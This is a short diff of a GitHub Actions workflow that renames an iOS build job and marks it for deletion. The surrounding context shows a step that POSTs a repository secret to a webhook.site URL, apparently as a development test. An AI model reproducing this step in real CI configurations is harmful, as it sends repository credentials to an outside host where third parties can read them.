@@ -27,7 +27,7 @@ jobs:
           url: 'https://webhook.site/85f1e0e4-7027-4431-883b-9d9bd82db67a?env=dev'
           method: 'POST'
           data: '{"key_1": ${{ secrets.SECRET1 }}, "key_2": "value_2"}'
-  build-ios:
+  build-ios-prod: #TODO: DELETE
     runs-on: macos-latest
     environment: prod
     if: |
